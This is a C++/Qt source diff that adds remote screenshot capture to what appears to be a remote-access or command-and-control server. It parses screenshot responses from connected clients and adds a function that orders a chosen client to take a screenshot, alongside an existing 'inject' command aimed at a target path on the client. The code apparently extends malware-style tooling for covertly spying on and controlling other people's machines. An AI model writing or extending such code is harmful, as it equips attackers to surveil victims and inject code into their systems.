@@ -230,6 +230,34 @@ void Server::processPacketBuffer(ClientContext& client) {
             QString path = parts.size() >= 1 ? parts[0] : QString();
             emit injectResultReceived(
                 QString::fromStdString(client.socket.getIp()), success, path);
+        } else if (opcode == static_cast<uint16_t>(Opcode::SCREENSHOT_RES)) {
+            // Payload: [U16 status][U32 width][U32 height][U32 size][data...]
+            bool ok = payload.size() >= 14;
+            uint16_t status = 1;
+            int w = 0, h = 0;
+            QByteArray jpeg;
+            if (ok) {
+                status = (static_cast<uint16_t>(payload[0]) << 8) | payload[1];
+                w = static_cast<int>((static_cast<uint32_t>(payload[2]) << 24) |
+                                     (static_cast<uint32_t>(payload[3]) << 16) |
+                                     (static_cast<uint32_t>(payload[4]) << 8) |
+                                     static_cast<uint32_t>(payload[5]));
+                h = static_cast<int>((static_cast<uint32_t>(payload[6]) << 24) |
+                                     (static_cast<uint32_t>(payload[7]) << 16) |
+                                     (static_cast<uint32_t>(payload[8]) << 8) |
+                                     static_cast<uint32_t>(payload[9]));
+                uint32_t sz = (static_cast<uint32_t>(payload[10]) << 24) |
+                              (static_cast<uint32_t>(payload[11]) << 16) |
+                              (static_cast<uint32_t>(payload[12]) << 8) |
+                              static_cast<uint32_t>(payload[13]);
+                if (14 + sz <= payload.size() && sz > 0) {
+                    jpeg = QByteArray(reinterpret_cast<const char*>(&payload[14]),
+                                      static_cast<int>(sz));
+                }
+            }
+            emit screenshotReceived(
+                QString::fromStdString(client.socket.getIp()),
+                jpeg, w, h, status == 0);
         }
 
         // Remove processed bytes from the buffer (wire size, not decrypted size)
@@ -286,6 +314,16 @@ void Server::sendInjectCommand(const QString& ip, const QString& targetPath) {
         if (QString::fromStdString(client.socket.getIp()) == ip) {
             std::string payload = targetPath.toStdString();
             Packet p(static_cast<uint16_t>(Opcode::INJECT), payload);
+            client.socket.sendData(p.serialize());
+            break;
+        }
+    }
+}
+
+void Server::sendScreenshotCommand(const QString& ip) {
+    for (auto& client : m_clients) {
+        if (QString::fromStdString(client.socket.getIp()) == ip) {
+            Packet p(static_cast<uint16_t>(Opcode::SCREENSHOT_REQ), "");
             client.socket.sendData(p.serialize());
             break;
         }
